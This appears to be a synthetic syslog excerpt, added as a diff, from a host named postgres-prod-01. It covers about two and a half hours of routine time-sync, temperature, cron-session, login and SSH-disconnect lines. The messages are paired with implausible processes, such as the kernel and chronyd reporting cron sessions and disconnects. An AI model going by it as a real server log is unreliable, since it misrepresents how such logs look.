+Aug 23 01:13:12 postgres-prod-01 chronyd[10205]: Time synchronised to time server
+Aug 23 01:13:19 postgres-prod-01 dbus-daemon[5333]: Received disconnect from 10.10.31.245 port 40001:11: disconnected by user
+Aug 23 01:13:20 postgres-prod-01 dbus-daemon[3966]: pam_unix(cron:session): session opened for user root
+Aug 23 01:13:26 postgres-prod-01 systemd-logind[27682]: CPU0: Package temperature normal
+Aug 23 01:14:07 postgres-prod-01 sshd[14351]: Received disconnect from 10.10.31.182 port 54136:11: disconnected by user
+Aug 23 01:14:28 postgres-prod-01 kernel[12129]: pam_unix(cron:session): session opened for user root
+Aug 23 01:14:29 postgres-prod-01 dbus-daemon[18114]: Time synchronised to time server
+Aug 23 01:15:12 postgres-prod-01 systemd-logind[11504]: CPU0: Package temperature normal
+Aug 23 01:16:03 postgres-prod-01 CRON[4897]: CPU0: Package temperature normal
+Aug 23 01:16:43 postgres-prod-01 kernel[29982]: Time synchronised to time server
+Aug 23 01:17:26 postgres-prod-01 chronyd[22672]: Time synchronised to time server
+Aug 23 01:17:35 postgres-prod-01 sudo[1120]: CPU0: Package temperature normal
+Aug 23 01:18:19 postgres-prod-01 systemd-logind[983]: pam_unix(cron:session): session opened for user root
+Aug 23 01:18:22 postgres-prod-01 chronyd[11093]: Time synchronised to time server
+Aug 23 01:18:49 postgres-prod-01 sudo[27602]: CPU0: Package temperature normal
+Aug 23 01:19:19 postgres-prod-01 CRON[19726]: Time synchronised to time server
+Aug 23 01:19:23 postgres-prod-01 sudo[14977]: Time synchronised to time server
+Aug 23 01:20:15 postgres-prod-01 sudo[23849]: Time synchronised to time server
+Aug 23 01:20:39 postgres-prod-01 kernel[21551]: Received disconnect from 10.10.31.158 port 54951:11: disconnected by user
+Aug 23 01:20:40 postgres-prod-01 kernel[2552]: Started Session 703 of user postgres.
+Aug 23 01:20:42 postgres-prod-01 sshd[4884]: pam_unix(cron:session): session opened for user root
+Aug 23 01:20:58 postgres-prod-01 CRON[18340]: Time synchronised to time server
+Aug 23 01:21:32 postgres-prod-01 systemd-logind[19386]: Started Session 547 of user jenkins.
+Aug 23 01:21:42 postgres-prod-01 sudo[8695]: pam_unix(cron:session): session opened for user root
+Aug 23 01:22:25 postgres-prod-01 chronyd[4154]: Time synchronised to time server
+Aug 23 01:22:54 postgres-prod-01 sshd[4806]: Time synchronised to time server
+Aug 23 01:23:03 postgres-prod-01 sshd[20761]: Time synchronised to time server
+Aug 23 01:23:07 postgres-prod-01 kernel[19928]: pam_unix(cron:session): session opened for user root
+Aug 23 01:23:22 postgres-prod-01 dbus-daemon[27218]: CPU0: Package temperature normal
+Aug 23 01:24:17 postgres-prod-01 CRON[25577]: pam_unix(cron:session): session opened for user root
+Aug 23 01:24:56 postgres-prod-01 chronyd[26991]: Time synchronised to time server
+Aug 23 01:25:02 postgres-prod-01 kernel[20987]: Time synchronised to time server
+Aug 23 01:25:53 postgres-prod-01 sshd[22587]: Started Session 14 of user devops.
+Aug 23 01:26:40 postgres-prod-01 sudo[27972]: pam_unix(cron:session): session opened for user root
+Aug 23 01:27:33 postgres-prod-01 CRON[16179]: Received disconnect from 10.10.31.101 port 43427:11: disconnected by user
+Aug 23 01:28:08 postgres-prod-01 chronyd[10630]: Time synchronised to time server
+Aug 23 01:28:55 postgres-prod-01 sudo[3488]: CPU0: Package temperature normal
+Aug 23 01:29:16 postgres-prod-01 sudo[353]: Received disconnect from 10.10.31.171 port 56312:11: disconnected by user
+Aug 23 01:29:33 postgres-prod-01 sudo[10154]: CPU0: Package temperature normal
+Aug 23 01:30:16 postgres-prod-01 chronyd[2423]: pam_unix(cron:session): session opened for user root
+Aug 23 01:30:50 postgres-prod-01 systemd-logind[6786]: pam_unix(cron:session): session opened for user root
+Aug 23 01:31:13 postgres-prod-01 kernel[15155]: CPU0: Package temperature normal
+Aug 23 01:31:16 postgres-prod-01 sudo[18962]: CPU0: Package temperature normal
+Aug 23 01:31:23 postgres-prod-01 systemd-logind[4737]: Started Session 841 of user webadmin.
+Aug 23 01:31:54 postgres-prod-01 systemd[26282]: Received disconnect from 10.10.31.172 port 43767:11: disconnected by user
+Aug 23 01:32:40 postgres-prod-01 CRON[9905]: Received disconnect from 10.10.31.174 port 42448:11: disconnected by user
+Aug 23 01:33:26 postgres-prod-01 sshd[20486]: CPU0: Package temperature normal
+Aug 23 01:33:45 postgres-prod-01 sshd[3658]: pam_unix(cron:session): session opened for user root
+Aug 23 01:34:36 postgres-prod-01 systemd-logind[15032]: CPU0: Package temperature normal
+Aug 23 01:34:55 postgres-prod-01 sudo[5136]: Received disconnect from 10.10.31.91 port 45810:11: disconnected by user
+Aug 23 01:35:16 postgres-prod-01 dbus-daemon[5825]: CPU0: Package temperature normal
+Aug 23 01:35:30 postgres-prod-01 sshd[16684]: Received disconnect from 10.10.31.248 port 61710:11: disconnected by user
+Aug 23 01:36:06 postgres-prod-01 sshd[28378]: CPU0: Package temperature normal
+Aug 23 01:36:44 postgres-prod-01 systemd[5777]: Time synchronised to time server
+Aug 23 01:37:34 postgres-prod-01 sshd[12770]: Time synchronised to time server
+Aug 23 01:37:47 postgres-prod-01 kernel[22827]: pam_unix(cron:session): session opened for user root
+Aug 23 01:38:19 postgres-prod-01 systemd[9190]: Time synchronised to time server
+Aug 23 01:38:47 postgres-prod-01 chronyd[27931]: Received disconnect from 10.10.31.91 port 59987:11: disconnected by user
+Aug 23 01:39:22 postgres-prod-01 sshd[15713]: Started Session 977 of user root.
+Aug 23 01:39:25 postgres-prod-01 systemd-logind[28869]: CPU0: Package temperature normal
+Aug 23 01:39:50 postgres-prod-01 sshd[15753]: pam_unix(cron:session): session opened for user root
+Aug 23 01:40:01 postgres-prod-01 CRON[12626]: CPU0: Package temperature normal
+Aug 23 01:40:49 postgres-prod-01 systemd-logind[17339]: Received disconnect from 10.10.31.187 port 55268:11: disconnected by user
+Aug 23 01:41:28 postgres-prod-01 dbus-daemon[6973]: Started Session 441 of user webadmin.
+Aug 23 01:41:46 postgres-prod-01 dbus-daemon[25182]: Started Session 711 of user postgres.
+Aug 23 01:42:38 postgres-prod-01 systemd[11908]: Started Session 403 of user jenkins.
+Aug 23 01:43:25 postgres-prod-01 sudo[23356]: Started Session 943 of user jenkins.
+Aug 23 01:43:34 postgres-prod-01 kernel[14110]: Received disconnect from 10.10.31.225 port 42113:11: disconnected by user
+Aug 23 01:44:27 postgres-prod-01 systemd-logind[21577]: CPU0: Package temperature normal
+Aug 23 01:44:41 postgres-prod-01 systemd-logind[15996]: Time synchronised to time server
+Aug 23 01:44:45 postgres-prod-01 sudo[19264]: Time synchronised to time server
+Aug 23 01:45:27 postgres-prod-01 systemd-logind[12874]: pam_unix(cron:session): session opened for user root
+Aug 23 01:45:53 postgres-prod-01 sudo[19847]: pam_unix(cron:session): session opened for user root
+Aug 23 01:46:01 postgres-prod-01 systemd[4982]: pam_unix(cron:session): session opened for user root
+Aug 23 01:46:31 postgres-prod-01 sshd[24030]: pam_unix(cron:session): session opened for user root
+Aug 23 01:47:18 postgres-prod-01 chronyd[2232]: CPU0: Package temperature normal
+Aug 23 01:47:29 postgres-prod-01 systemd-logind[17795]: CPU0: Package temperature normal
+Aug 23 01:48:00 postgres-prod-01 CRON[8403]: CPU0: Package temperature normal
+Aug 23 01:48:19 postgres-prod-01 dbus-daemon[20552]: Time synchronised to time server
+Aug 23 01:48:55 postgres-prod-01 systemd-logind[6492]: CPU0: Package temperature normal
+Aug 23 01:49:20 postgres-prod-01 chronyd[16907]: Time synchronised to time server
+Aug 23 01:49:34 postgres-prod-01 systemd[18350]: Received disconnect from 10.10.31.226 port 46114:11: disconnected by user
+Aug 23 01:50:28 postgres-prod-01 dbus-daemon[2367]: pam_unix(cron:session): session opened for user root
+Aug 23 01:50:31 postgres-prod-01 systemd[13675]: pam_unix(cron:session): session opened for user root
+Aug 23 01:51:19 postgres-prod-01 sudo[29671]: Started Session 461 of user jenkins.
+Aug 23 01:51:44 postgres-prod-01 CRON[19477]: CPU0: Package temperature normal
+Aug 23 01:52:10 postgres-prod-01 sudo[21693]: Time synchronised to time server
+Aug 23 01:52:19 postgres-prod-01 systemd-logind[3207]: CPU0: Package temperature normal
+Aug 23 01:52:50 postgres-prod-01 chronyd[5197]: pam_unix(cron:session): session opened for user root
+Aug 23 01:53:32 postgres-prod-01 kernel[23660]: Time synchronised to time server
+Aug 23 01:53:45 postgres-prod-01 systemd[20431]: Received disconnect from 10.10.31.5 port 47711:11: disconnected by user
+Aug 23 01:54:17 postgres-prod-01 systemd[18015]: Time synchronised to time server
+Aug 23 01:54:50 postgres-prod-01 chronyd[1597]: pam_unix(cron:session): session opened for user root
+Aug 23 01:55:25 postgres-prod-01 systemd-logind[16421]: pam_unix(cron:session): session opened for user root
+Aug 23 01:56:06 postgres-prod-01 sshd[14609]: Time synchronised to time server
+Aug 23 01:56:58 postgres-prod-01 chronyd[27111]: Time synchronised to time server
+Aug 23 01:57:51 postgres-prod-01 dbus-daemon[27710]: CPU0: Package temperature normal
+Aug 23 01:58:20 postgres-prod-01 kernel[14972]: Started Session 108 of user webadmin.
+Aug 23 01:58:26 postgres-prod-01 systemd-logind[11347]: Started Session 817 of user postgres.
+Aug 23 01:58:44 postgres-prod-01 systemd[5946]: Time synchronised to time server
+Aug 23 01:59:23 postgres-prod-01 sudo[25914]: pam_unix(cron:session): session opened for user root
+Aug 23 01:59:48 postgres-prod-01 systemd[12646]: Started Session 192 of user devops.
+Aug 23 02:00:41 postgres-prod-01 systemd-logind[10324]: Started Session 181 of user svc-backup.
+Aug 23 02:01:17 postgres-prod-01 systemd[5039]: Time synchronised to time server
+Aug 23 02:02:01 postgres-prod-01 systemd[2916]: Started Session 760 of user svc-backup.
+Aug 23 02:02:13 postgres-prod-01 systemd-logind[10437]: Received disconnect from 10.10.31.124 port 43059:11: disconnected by user
+Aug 23 02:02:28 postgres-prod-01 kernel[4268]: CPU0: Package temperature normal
+Aug 23 02:03:07 postgres-prod-01 kernel[12359]: Received disconnect from 10.10.31.81 port 45247:11: disconnected by user
+Aug 23 02:03:15 postgres-prod-01 sshd[14913]: CPU0: Package temperature normal
+Aug 23 02:04:10 postgres-prod-01 dbus-daemon[4997]: Started Session 226 of user root.
+Aug 23 02:04:36 postgres-prod-01 systemd[22861]: Received disconnect from 10.10.31.184 port 51873:11: disconnected by user
+Aug 23 02:04:39 postgres-prod-01 kernel[11477]: Started Session 179 of user root.
+Aug 23 02:05:18 postgres-prod-01 sudo[29790]: CPU0: Package temperature normal
+Aug 23 02:05:29 postgres-prod-01 kernel[19266]: Started Session 377 of user jenkins.
+Aug 23 02:06:13 postgres-prod-01 sudo[8852]: Time synchronised to time server
+Aug 23 02:06:53 postgres-prod-01 sshd[15589]: Received disconnect from 10.10.31.62 port 55816:11: disconnected by user
+Aug 23 02:07:18 postgres-prod-01 systemd-logind[16911]: CPU0: Package temperature normal
+Aug 23 02:08:00 postgres-prod-01 sshd[10244]: Received disconnect from 10.10.31.162 port 55553:11: disconnected by user
+Aug 23 02:08:27 postgres-prod-01 sshd[26581]: pam_unix(cron:session): session opened for user root
+Aug 23 02:08:37 postgres-prod-01 sudo[1418]: Started Session 51 of user devops.
+Aug 23 02:08:38 postgres-prod-01 systemd-logind[13766]: Time synchronised to time server
+Aug 23 02:09:33 postgres-prod-01 kernel[3511]: Received disconnect from 10.10.31.231 port 45539:11: disconnected by user
+Aug 23 02:09:46 postgres-prod-01 dbus-daemon[26537]: Time synchronised to time server
+Aug 23 02:09:50 postgres-prod-01 dbus-daemon[29300]: CPU0: Package temperature normal
+Aug 23 02:10:14 postgres-prod-01 systemd-logind[7604]: Started Session 267 of user jenkins.
+Aug 23 02:10:51 postgres-prod-01 systemd[9357]: CPU0: Package temperature normal
+Aug 23 02:11:03 postgres-prod-01 CRON[5986]: Started Session 55 of user svc-backup.
+Aug 23 02:11:42 postgres-prod-01 dbus-daemon[13870]: CPU0: Package temperature normal
+Aug 23 02:11:43 postgres-prod-01 systemd-logind[16551]: Started Session 900 of user jenkins.
+Aug 23 02:12:20 postgres-prod-01 chronyd[743]: pam_unix(cron:session): session opened for user root
+Aug 23 02:12:42 postgres-prod-01 systemd[22841]: Time synchronised to time server
+Aug 23 02:13:05 postgres-prod-01 CRON[27109]: Time synchronised to time server
+Aug 23 02:13:58 postgres-prod-01 sshd[13765]: Started Session 911 of user webadmin.
+Aug 23 02:14:45 postgres-prod-01 kernel[2828]: pam_unix(cron:session): session opened for user root
+Aug 23 02:15:28 postgres-prod-01 systemd[22861]: Received disconnect from 10.10.31.30 port 52301:11: disconnected by user
+Aug 23 02:15:54 postgres-prod-01 systemd[8996]: CPU0: Package temperature normal
+Aug 23 02:16:15 postgres-prod-01 chronyd[22344]: Received disconnect from 10.10.31.126 port 53836:11: disconnected by user
+Aug 23 02:16:28 postgres-prod-01 kernel[5189]: Time synchronised to time server
+Aug 23 02:17:05 postgres-prod-01 kernel[1177]: Received disconnect from 10.10.31.139 port 42984:11: disconnected by user
+Aug 23 02:17:51 postgres-prod-01 systemd-logind[26459]: Started Session 69 of user devops.
+Aug 23 02:18:02 postgres-prod-01 sudo[5134]: Time synchronised to time server
+Aug 23 02:18:26 postgres-prod-01 chronyd[25114]: Received disconnect from 10.10.31.126 port 44050:11: disconnected by user
+Aug 23 02:18:57 postgres-prod-01 kernel[15782]: pam_unix(cron:session): session opened for user root
+Aug 23 02:19:24 postgres-prod-01 dbus-daemon[14623]: pam_unix(cron:session): session opened for user root
+Aug 23 02:19:43 postgres-prod-01 dbus-daemon[29687]: Time synchronised to time server
+Aug 23 02:20:26 postgres-prod-01 CRON[25062]: pam_unix(cron:session): session opened for user root
+Aug 23 02:20:40 postgres-prod-01 kernel[6902]: Started Session 217 of user webadmin.
+Aug 23 02:20:50 postgres-prod-01 sshd[18367]: pam_unix(cron:session): session opened for user root
+Aug 23 02:20:52 postgres-prod-01 systemd-logind[19666]: CPU0: Package temperature normal
+Aug 23 02:21:47 postgres-prod-01 sshd[28614]: pam_unix(cron:session): session opened for user root
+Aug 23 02:22:10 postgres-prod-01 sudo[16156]: pam_unix(cron:session): session opened for user root
+Aug 23 02:22:24 postgres-prod-01 kernel[29265]: CPU0: Package temperature normal
+Aug 23 02:23:18 postgres-prod-01 systemd[8456]: pam_unix(cron:session): session opened for user root
+Aug 23 02:23:32 postgres-prod-01 dbus-daemon[11063]: pam_unix(cron:session): session opened for user root
+Aug 23 02:24:17 postgres-prod-01 sudo[3869]: Started Session 968 of user svc-backup.
+Aug 23 02:25:02 postgres-prod-01 kernel[21687]: pam_unix(cron:session): session opened for user root
+Aug 23 02:25:39 postgres-prod-01 CRON[24991]: CPU0: Package temperature normal
+Aug 23 02:26:17 postgres-prod-01 dbus-daemon[25550]: pam_unix(cron:session): session opened for user root
+Aug 23 02:27:07 postgres-prod-01 sshd[5287]: Started Session 875 of user webadmin.
+Aug 23 02:27:44 postgres-prod-01 sudo[22894]: Started Session 189 of user postgres.
+Aug 23 02:27:48 postgres-prod-01 CRON[13053]: Time synchronised to time server
+Aug 23 02:28:13 postgres-prod-01 kernel[15510]: pam_unix(cron:session): session opened for user root
+Aug 23 02:28:38 postgres-prod-01 kernel[16673]: pam_unix(cron:session): session opened for user root
+Aug 23 02:29:29 postgres-prod-01 CRON[20647]: Time synchronised to time server
+Aug 23 02:29:31 postgres-prod-01 systemd[19863]: CPU0: Package temperature normal
+Aug 23 02:29:42 postgres-prod-01 CRON[10561]: pam_unix(cron:session): session opened for user root
+Aug 23 02:30:36 postgres-prod-01 kernel[14940]: CPU0: Package temperature normal
+Aug 23 02:30:42 postgres-prod-01 sshd[16343]: Time synchronised to time server
+Aug 23 02:30:54 postgres-prod-01 chronyd[19168]: Time synchronised to time server
+Aug 23 02:31:33 postgres-prod-01 sshd[24710]: CPU0: Package temperature normal
+Aug 23 02:32:26 postgres-prod-01 kernel[6163]: Time synchronised to time server
+Aug 23 02:32:53 postgres-prod-01 systemd-logind[23966]: pam_unix(cron:session): session opened for user root
+Aug 23 02:33:44 postgres-prod-01 chronyd[14512]: Time synchronised to time server
+Aug 23 02:33:50 postgres-prod-01 systemd-logind[17137]: pam_unix(cron:session): session opened for user root
+Aug 23 02:34:41 postgres-prod-01 systemd-logind[22132]: CPU0: Package temperature normal
+Aug 23 02:35:33 postgres-prod-01 dbus-daemon[25953]: Received disconnect from 10.10.31.8 port 63810:11: disconnected by user
+Aug 23 02:36:27 postgres-prod-01 CRON[19699]: Started Session 389 of user postgres.
+Aug 23 02:37:12 postgres-prod-01 sudo[18288]: pam_unix(cron:session): session opened for user root
+Aug 23 02:37:51 postgres-prod-01 systemd[20311]: CPU0: Package temperature normal
+Aug 23 02:38:22 postgres-prod-01 kernel[26093]: pam_unix(cron:session): session opened for user root
+Aug 23 02:38:39 postgres-prod-01 sudo[6689]: Started Session 232 of user svc-backup.
+Aug 23 02:39:24 postgres-prod-01 kernel[29271]: Started Session 991 of user postgres.
+Aug 23 02:39:32 postgres-prod-01 kernel[13584]: Time synchronised to time server
+Aug 23 02:39:49 postgres-prod-01 CRON[15494]: pam_unix(cron:session): session opened for user root
+Aug 23 02:40:20 postgres-prod-01 systemd[5817]: Time synchronised to time server
+Aug 23 02:40:34 postgres-prod-01 dbus-daemon[26078]: Time synchronised to time server
+Aug 23 02:41:00 postgres-prod-01 CRON[19776]: CPU0: Package temperature normal
+Aug 23 02:41:21 postgres-prod-01 systemd[23420]: Time synchronised to time server
+Aug 23 02:41:56 postgres-prod-01 systemd[16356]: pam_unix(cron:session): session opened for user root
+Aug 23 02:42:32 postgres-prod-01 chronyd[19126]: Started Session 767 of user jenkins.
+Aug 23 02:42:46 postgres-prod-01 CRON[22978]: Time synchronised to time server
+Aug 23 02:43:38 postgres-prod-01 systemd[4016]: Started Session 939 of user jenkins.
+Aug 23 02:44:09 postgres-prod-01 dbus-daemon[29764]: pam_unix(cron:session): session opened for user root
+Aug 23 02:45:00 postgres-prod-01 dbus-daemon[11840]: Started Session 650 of user svc-backup.
+Aug 23 02:45:22 postgres-prod-01 sshd[4895]: Started Session 960 of user webadmin.
+Aug 23 02:46:00 postgres-prod-01 systemd-logind[4540]: Started Session 931 of user postgres.
+Aug 23 02:46:41 postgres-prod-01 dbus-daemon[1060]: Received disconnect from 10.10.31.154 port 44018:11: disconnected by user
+Aug 23 02:47:35 postgres-prod-01 dbus-daemon[9728]: pam_unix(cron:session): session opened for user root
+Aug 23 02:47:40 postgres-prod-01 systemd[26380]: CPU0: Package temperature normal
+Aug 23 02:48:02 postgres-prod-01 chronyd[19263]: pam_unix(cron:session): session opened for user root
+Aug 23 02:48:54 postgres-prod-01 sshd[1735]: Time synchronised to time server
+Aug 23 02:49:20 postgres-prod-01 sshd[23424]: Received disconnect from 10.10.31.240 port 46060:11: disconnected by user
+Aug 23 02:49:32 postgres-prod-01 systemd-logind[24120]: Received disconnect from 10.10.31.11 port 47681:11: disconnected by user
+Aug 23 02:50:05 postgres-prod-01 sshd[23435]: CPU0: Package temperature normal
+Aug 23 02:50:09 postgres-prod-01 CRON[8332]: Time synchronised to time server
+Aug 23 02:50:54 postgres-prod-01 systemd-logind[13546]: Started Session 455 of user root.
+Aug 23 02:51:20 postgres-prod-01 systemd-logind[26733]: Received disconnect from 10.10.31.167 port 40532:11: disconnected by user
+Aug 23 02:51:57 postgres-prod-01 CRON[29635]: pam_unix(cron:session): session opened for user root
+Aug 23 02:52:24 postgres-prod-01 kernel[19797]: CPU0: Package temperature normal
+Aug 23 02:52:48 postgres-prod-01 CRON[8525]: CPU0: Package temperature normal
+Aug 23 02:52:52 postgres-prod-01 systemd[29530]: Started Session 223 of user webadmin.
+Aug 23 02:53:10 postgres-prod-01 systemd-logind[4752]: Time synchronised to time server
+Aug 23 02:53:16 postgres-prod-01 sshd[26629]: pam_unix(cron:session): session opened for user root
+Aug 23 02:54:08 postgres-prod-01 systemd[13890]: CPU0: Package temperature normal
+Aug 23 02:54:50 postgres-prod-01 systemd-logind[20252]: pam_unix(cron:session): session opened for user root
+Aug 23 02:55:12 postgres-prod-01 sudo[17236]: Started Session 594 of user postgres.
+Aug 23 02:55:26 postgres-prod-01 systemd[10423]: Received disconnect from 10.10.31.173 port 49358:11: disconnected by user
+Aug 23 02:55:54 postgres-prod-01 systemd-logind[3822]: CPU0: Package temperature normal
+Aug 23 02:56:44 postgres-prod-01 dbus-daemon[12381]: Received disconnect from 10.10.31.38 port 40341:11: disconnected by user
+Aug 23 02:57:26 postgres-prod-01 systemd-logind[23650]: CPU0: Package temperature normal
+Aug 23 02:58:11 postgres-prod-01 dbus-daemon[19396]: Received disconnect from 10.10.31.246 port 54616:11: disconnected by user
+Aug 23 02:59:01 postgres-prod-01 systemd-logind[11371]: pam_unix(cron:session): session opened for user root
+Aug 23 02:59:18 postgres-prod-01 CRON[17921]: pam_unix(cron:session): session opened for user root
+Aug 23 03:00:00 postgres-prod-01 chronyd[10138]: Received disconnect from 10.10.31.56 port 45387:11: disconnected by user
+Aug 23 03:00:32 postgres-prod-01 dbus-daemon[27486]: pam_unix(cron:session): session opened for user root
+Aug 23 03:00:40 postgres-prod-01 sshd[5474]: CPU0: Package temperature normal
+Aug 23 03:01:35 postgres-prod-01 systemd-logind[9947]: Received disconnect from 10.10.31.47 port 44785:11: disconnected by user
+Aug 23 03:01:47 postgres-prod-01 dbus-daemon[19109]: CPU0: Package temperature normal
+Aug 23 03:02:31 postgres-prod-01 systemd[10662]: pam_unix(cron:session): session opened for user root
+Aug 23 03:03:23 postgres-prod-01 sudo[17421]: Time synchronised to time server
+Aug 23 03:04:05 postgres-prod-01 kernel[16476]: Received disconnect from 10.10.31.201 port 53612:11: disconnected by user
+Aug 23 03:04:12 postgres-prod-01 CRON[29798]: Started Session 379 of user devops.
+Aug 23 03:04:25 postgres-prod-01 dbus-daemon[19764]: CPU0: Package temperature normal
+Aug 23 03:05:20 postgres-prod-01 chronyd[20202]: Time synchronised to time server
+Aug 23 03:05:49 postgres-prod-01 CRON[7585]: CPU0: Package temperature normal
+Aug 23 03:05:55 postgres-prod-01 dbus-daemon[9856]: Started Session 31 of user jenkins.
+Aug 23 03:06:37 postgres-prod-01 sudo[22414]: Received disconnect from 10.10.31.184 port 54670:11: disconnected by user
+Aug 23 03:07:19 postgres-prod-01 kernel[22937]: pam_unix(cron:session): session opened for user root
+Aug 23 03:07:31 postgres-prod-01 sudo[18374]: CPU0: Package temperature normal
+Aug 23 03:08:09 postgres-prod-01 systemd[27448]: Received disconnect from 10.10.31.105 port 50147:11: disconnected by user
+Aug 23 03:08:46 postgres-prod-01 CRON[5682]: Received disconnect from 10.10.31.139 port 46621:11: disconnected by user
+Aug 23 03:09:38 postgres-prod-01 systemd[21736]: CPU0: Package temperature normal
+Aug 23 03:09:45 postgres-prod-01 sshd[3236]: CPU0: Package temperature normal
+Aug 23 03:10:12 postgres-prod-01 dbus-daemon[9377]: Received disconnect from 10.10.31.120 port 47272:11: disconnected by user
+Aug 23 03:10:23 postgres-prod-01 sudo[16904]: Time synchronised to time server
+Aug 23 03:11:15 postgres-prod-01 systemd-logind[10402]: pam_unix(cron:session): session opened for user root
+Aug 23 03:11:40 postgres-prod-01 sudo[9893]: CPU0: Package temperature normal
+Aug 23 03:12:29 postgres-prod-01 CRON[18031]: Started Session 4 of user devops.
+Aug 23 03:13:15 postgres-prod-01 systemd-logind[366]: Started Session 347 of user devops.
+Aug 23 03:13:34 postgres-prod-01 dbus-daemon[8827]: Received disconnect from 10.10.31.243 port 58834:11: disconnected by user
+Aug 23 03:13:56 postgres-prod-01 sudo[3558]: pam_unix(cron:session): session opened for user root
+Aug 23 03:14:51 postgres-prod-01 chronyd[26408]: Started Session 619 of user svc-backup.
+Aug 23 03:15:42 postgres-prod-01 kernel[26338]: Time synchronised to time server
+Aug 23 03:16:19 postgres-prod-01 systemd[29163]: pam_unix(cron:session): session opened for user root
+Aug 23 03:17:05 postgres-prod-01 systemd-logind[16892]: Received disconnect from 10.10.31.85 port 41915:11: disconnected by user
+Aug 23 03:17:26 postgres-prod-01 CRON[10672]: Started Session 22 of user jenkins.
+Aug 23 03:18:07 postgres-prod-01 sudo[10532]: Time synchronised to time server
+Aug 23 03:18:22 postgres-prod-01 dbus-daemon[1151]: CPU0: Package temperature normal
+Aug 23 03:18:43 postgres-prod-01 dbus-daemon[9947]: Time synchronised to time server
+Aug 23 03:18:54 postgres-prod-01 systemd[11794]: Received disconnect from 10.10.31.45 port 57825:11: disconnected by user
+Aug 23 03:19:45 postgres-prod-01 systemd-logind[17210]: Time synchronised to time server
+Aug 23 03:19:55 postgres-prod-01 chronyd[13235]: Received disconnect from 10.10.31.15 port 59169:11: disconnected by user
+Aug 23 03:20:17 postgres-prod-01 sshd[28227]: CPU0: Package temperature normal
+Aug 23 03:21:02 postgres-prod-01 sudo[11464]: Started Session 235 of user devops.
+Aug 23 03:21:22 postgres-prod-01 systemd-logind[28478]: pam_unix(cron:session): session opened for user root
+Aug 23 03:21:23 postgres-prod-01 systemd[25111]: CPU0: Package temperature normal
+Aug 23 03:22:11 postgres-prod-01 dbus-daemon[14884]: Received disconnect from 10.10.31.200 port 54054:11: disconnected by user
+Aug 23 03:22:29 postgres-prod-01 chronyd[28430]: Started Session 261 of user devops.
+Aug 23 03:23:15 postgres-prod-01 sudo[23161]: pam_unix(cron:session): session opened for user root
+Aug 23 03:23:19 postgres-prod-01 kernel[21455]: Time synchronised to time server
+Aug 23 03:24:05 postgres-prod-01 sshd[12640]: Received disconnect from 10.10.31.4 port 53283:11: disconnected by user
+Aug 23 03:24:16 postgres-prod-01 systemd[916]: Time synchronised to time server
+Aug 23 03:24:33 postgres-prod-01 sshd[16861]: Started Session 346 of user svc-backup.
+Aug 23 03:25:05 postgres-prod-01 systemd-logind[24980]: Started Session 347 of user webadmin.
+Aug 23 03:25:11 postgres-prod-01 chronyd[9179]: CPU0: Package temperature normal
+Aug 23 03:25:24 postgres-prod-01 systemd-logind[13359]: Time synchronised to time server
+Aug 23 03:26:09 postgres-prod-01 chronyd[24941]: Received disconnect from 10.10.31.40 port 46143:11: disconnected by user
+Aug 23 03:26:39 postgres-prod-01 sshd[15485]: Received disconnect from 10.10.31.64 port 54585:11: disconnected by user
+Aug 23 03:26:47 postgres-prod-01 systemd[656]: Started Session 183 of user svc-backup.
+Aug 23 03:26:53 postgres-prod-01 chronyd[7998]: CPU0: Package temperature normal
+Aug 23 03:27:23 postgres-prod-01 chronyd[12111]: Received disconnect from 10.10.31.215 port 60775:11: disconnected by user
+Aug 23 03:28:02 postgres-prod-01 systemd-logind[24540]: CPU0: Package temperature normal
+Aug 23 03:28:36 postgres-prod-01 CRON[3386]: Time synchronised to time server
+Aug 23 03:29:11 postgres-prod-01 kernel[7423]: CPU0: Package temperature normal
+Aug 23 03:29:31 postgres-prod-01 dbus-daemon[17978]: CPU0: Package temperature normal
+Aug 23 03:29:52 postgres-prod-01 chronyd[10905]: CPU0: Package temperature normal
+Aug 23 03:30:26 postgres-prod-01 systemd-logind[13276]: CPU0: Package temperature normal
+Aug 23 03:30:53 postgres-prod-01 chronyd[23768]: Started Session 268 of user postgres.
+Aug 23 03:31:11 postgres-prod-01 systemd[19942]: Started Session 90 of user postgres.
+Aug 23 03:31:32 postgres-prod-01 dbus-daemon[13933]: Time synchronised to time server
+Aug 23 03:32:09 postgres-prod-01 sshd[1910]: pam_unix(cron:session): session opened for user root
+Aug 23 03:32:24 postgres-prod-01 kernel[28199]: Time synchronised to time server
+Aug 23 03:33:08 postgres-prod-01 kernel[20289]: Started Session 397 of user postgres.
+Aug 23 03:33:50 postgres-prod-01 CRON[27183]: Received disconnect from 10.10.31.100 port 49222:11: disconnected by user
+Aug 23 03:34:20 postgres-prod-01 sshd[29267]: CPU0: Package temperature normal
+Aug 23 03:34:23 postgres-prod-01 sudo[17851]: pam_unix(cron:session): session opened for user root
+Aug 23 03:34:30 postgres-prod-01 CRON[22746]: Started Session 479 of user devops.
+Aug 23 03:34:58 postgres-prod-01 systemd-logind[22809]: Received disconnect from 10.10.31.96 port 56189:11: disconnected by user
+Aug 23 03:35:35 postgres-prod-01 CRON[4041]: Time synchronised to time server
+Aug 23 03:35:47 postgres-prod-01 systemd-logind[26699]: pam_unix(cron:session): session opened for user root
+Aug 23 03:36:26 postgres-prod-01 systemd-logind[25094]: CPU0: Package temperature normal
+Aug 23 03:37:01 postgres-prod-01 kernel[16277]: Received disconnect from 10.10.31.109 port 56061:11: disconnected by user
+Aug 23 03:37:20 postgres-prod-01 kernel[4157]: pam_unix(cron:session): session opened for user root
+Aug 23 03:37:34 postgres-prod-01 chronyd[13953]: CPU0: Package temperature normal
+Aug 23 03:37:41 postgres-prod-01 sshd[23018]: Time synchronised to time server
+Aug 23 03:38:08 postgres-prod-01 chronyd[538]: CPU0: Package temperature normal
+Aug 23 03:38:43 postgres-prod-01 chronyd[5752]: CPU0: Package temperature normal
+Aug 23 03:39:25 postgres-prod-01 dbus-daemon[7140]: Time synchronised to time server
+Aug 23 03:39:30 postgres-prod-01 sshd[9056]: Time synchronised to time server
+Aug 23 03:40:20 postgres-prod-01 dbus-daemon[6874]: CPU0: Package temperature normal
+Aug 23 03:41:02 postgres-prod-01 chronyd[12679]: pam_unix(cron:session): session opened for user root
+Aug 23 03:41:22 postgres-prod-01 sudo[7247]: Received disconnect from 10.10.31.229 port 57642:11: disconnected by user
+Aug 23 03:41:57 postgres-prod-01 kernel[19628]: Received disconnect from 10.10.31.78 port 56132:11: disconnected by user
+Aug 23 03:42:10 postgres-prod-01 chronyd[12854]: Received disconnect from 10.10.31.123 port 60542:11: disconnected by user
+Aug 23 03:42:17 postgres-prod-01 sshd[22806]: Time synchronised to time server
